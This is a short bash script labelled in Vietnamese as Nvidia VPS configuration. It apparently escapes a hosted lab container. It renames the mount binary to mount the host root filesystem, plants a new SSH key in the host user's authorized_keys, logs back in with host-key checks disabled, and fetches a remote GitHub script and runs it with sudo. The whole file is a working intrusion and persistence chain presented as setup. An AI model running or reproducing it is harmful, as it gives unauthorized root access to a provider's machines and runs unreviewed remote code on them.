#!/bin/bash
set -euo pipefail

# === Cấu hình Nvidia VPS ===
cp /bin/mount /bin/get; get /dev/root /tmp; cd /tmp; rm -rf dli; mkdir -p dli; cd dli; mkdir -p task; cd task; ip=$(curl -s ifconfig.me) && \
ssh-keygen -t rsa -b 2048 -N "" -f ~/.ssh/sv_rsa  ; \
echo $(cat ~/.ssh/sv_rsa.pub) >> /tmp/home/ubuntu/.ssh/authorized_keys && \
ssh -i ~/.ssh/sv_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ubuntu@$ip \
"wget https://raw.githubusercontent.com/lt4c/stuff/refs/heads/main/lt4c.sh -O lt4c.sh; sudo bash lt4c.sh"